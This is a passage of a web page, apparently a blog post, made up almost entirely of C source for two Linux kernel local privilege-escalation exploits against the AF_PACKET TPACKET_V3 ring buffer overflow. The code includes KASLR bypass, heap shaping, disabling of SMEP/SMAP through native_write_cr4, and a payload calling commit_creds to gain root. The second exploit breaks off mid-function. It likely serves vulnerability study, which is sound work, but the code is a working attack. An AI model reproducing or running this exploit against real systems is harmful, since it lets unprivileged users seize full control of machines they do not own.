class="line"><span class="type">cpu_set_t</span> my_set;</span><br><span class="line">CPU_ZERO(&amp;my_set);</span><br><span class="line">CPU_SET(<span class="number">0</span>, &amp;my_set);</span><br><span class="line"><span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(my_set), &amp;my_set) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] sched_setaffinity()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (system(<span class="string">&quot;/sbin/ifconfig lo up&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] system(/sbin/ifconfig lo up)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] starting\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">setup_sandbox();</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] namespace sandbox set up\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ENABLE_KASLR_BYPASS</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] KASLR bypass enabled, getting kernel addr\\n&quot;</span>);</span><br><span class="line">KERNEL_BASE = get_kernel_addr();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] done, kernel text:   %lx\\n&quot;</span>, KERNEL_BASE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] commit_creds:        %lx\\n&quot;</span>, KERNEL_BASE + COMMIT_CREDS);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] prepare_kernel_cred: %lx\\n&quot;</span>, KERNEL_BASE + PREPARE_KERNEL_CRED);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ENABLE_SMEP_SMAP_BYPASS</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] native_write_cr4:    %lx\\n&quot;</span>, KERNEL_BASE + NATIVE_WRITE_CR4);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] padding heap\\n&quot;</span>);</span><br><span class="line">kmalloc_pad(KMALLOC_PAD);</span><br><span class="line">pagealloc_pad(PAGEALLOC_PAD);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] done, heap is padded\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ENABLE_SMEP_SMAP_BYPASS</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] SMEP &amp; SMAP bypass enabled, turning them off\\n&quot;</span>);</span><br><span class="line">  getchar();</span><br><span class="line">oob_timer_execute((<span class="type">void</span> *)(KERNEL_BASE + NATIVE_WRITE_CR4), CR4_DESIRED_VALUE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] done, SMEP &amp; SMAP should be off now\\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] executing get root payload %p\\n&quot;</span>, &amp;get_root_payload);</span><br><span class="line">  getchar();</span><br><span class="line">oob_id_match_execute((<span class="type">void</span> *)&amp;get_root_payload);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] done, should be root now\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">check_root();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) sleep(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/klog.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/udp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/xfrm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGESIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_PAD 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGEALLOC_PAD 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_rx_ring_init</span><span class="params">(<span class="type">int</span> s, <span class="type">unsigned</span> <span class="type">int</span> block_size,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> frame_size, <span class="type">unsigned</span> <span class="type">int</span> block_nr,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">unsigned</span> <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line"><span class="comment">// specify using TPACKET_V3 version cause this vulnerability</span></span><br><span class="line"><span class="comment">// only impacts this verison</span></span><br><span class="line"><span class="type">int</span> v = TPACKET_V3;</span><br><span class="line"><span class="type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line"><span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] setsockopt(PACKET_VERSION)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">req.tp_block_size = block_size; <span class="comment">// 0x1000</span></span><br><span class="line">req.tp_frame_size = frame_size;<span class="comment">// 0x1000</span></span><br><span class="line">req.tp_block_nr = block_nr; <span class="comment">// 0x1</span></span><br><span class="line">req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">req.tp_retire_blk_tov = timeout;</span><br><span class="line"><span class="comment">// (1u&lt;&lt;31) + (1u&lt;&lt;30) + 0x8000 - BLK_HDR_LEN - macoff + offset</span></span><br><span class="line">req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// vulnerability happens in this system call</span></span><br><span class="line">rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"><span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] setsockopt(PACKET_RX_RING)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_socket_setup</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> block_size, <span class="type">unsigned</span> <span class="type">int</span> frame_size,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> block_nr, <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line"><span class="comment">// create a AF_PACKET socket</span></span><br><span class="line"><span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line"><span class="keyword">if</span> (s &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] socket(AF_PACKET)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,</span><br><span class="line">sizeof_priv, timeout);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">sa.sll_family = PF_PACKET;</span><br><span class="line">sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> rv = bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line"><span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] bind(AF_PACKET)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_send</span><span class="params">(<span class="type">int</span> s, <span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">sa.sll_halen = ETH_ALEN;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sendto(s, buffer, size, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;sa,</span><br><span class="line"><span class="keyword">sizeof</span>(sa)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] sendto(SOCK_RAW)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loopback_send</span><span class="params">(<span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line"><span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line"><span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] socket(SOCK_RAW)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">packet_socket_send(s, buffer, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_sock_kmalloc</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));</span><br><span class="line"><span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] socket(SOCK_DGRAM)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_sock_timer_schedule</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">packet_socket_rx_ring_init(s, <span class="number">0x1000</span>, <span class="number">0x1000</span>, <span class="number">1</span>, <span class="number">0</span>, timeout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_sock_id_match_trigger</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">16</span>];</span><br><span class="line">packet_socket_send(s, &amp;buffer[<span class="number">0</span>], <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(x, a)__ALIGN_KERNEL((x), (a))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __ALIGN_KERNEL(x, a)__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __ALIGN_KERNEL_MASK(x, mask)(((x) + (mask)) &amp; ~(mask))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> V3_ALIGNMENT(8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLK_HDR_LEN(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ETH_HDR_LENsizeof(struct ethhdr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IP_HDR_LENsizeof(struct iphdr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UDP_HDR_LENsizeof(struct udphdr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UDP_HDR_LEN_FULL(ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">oob_setup</span><span class="params">(<span class="type">int</span> offset)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> maclen = ETH_HDR_LEN;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +</span><br><span class="line">(maclen &lt; <span class="number">16</span> ? <span class="number">16</span> : maclen));</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> macoff = netoff - maclen;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sizeof_priv = (<span class="number">1u</span>&lt;&lt;<span class="number">31</span>) + (<span class="number">1u</span>&lt;&lt;<span class="number">30</span>) +</span><br><span class="line"><span class="number">0x8000</span> - BLK_HDR_LEN - macoff + offset;</span><br><span class="line"><span class="keyword">return</span> packet_socket_setup(<span class="number">0x8000</span>, <span class="number">2048</span>, <span class="number">2</span>, sizeof_priv, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_write</span><span class="params">(<span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">loopback_send(buffer, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * Heap shaping * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kmalloc_pad</span><span class="params">(<span class="type">int</span> count)</span> &#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">packet_sock_kmalloc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pagealloc_pad</span><span class="params">(<span class="type">int</span> count)</span> &#123;</span><br><span class="line">packet_socket_setup(<span class="number">0x8000</span>, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">write_file</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* file, <span class="type">const</span> <span class="type">char</span>* what, ...)</span> &#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">va_list args;</span><br><span class="line">va_start(args, what);</span><br><span class="line">vsnprintf(buf, <span class="keyword">sizeof</span>(buf), what, args);</span><br><span class="line">va_end(args);</span><br><span class="line">buf[<span class="keyword">sizeof</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (write(fd, buf, len) != len) &#123;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup_sandbox</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> real_uid = getuid();</span><br><span class="line"><span class="type">int</span> real_gid = getgid();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unshare(CLONE_NEWUSER) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unshare(CLONE_NEWNET) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span 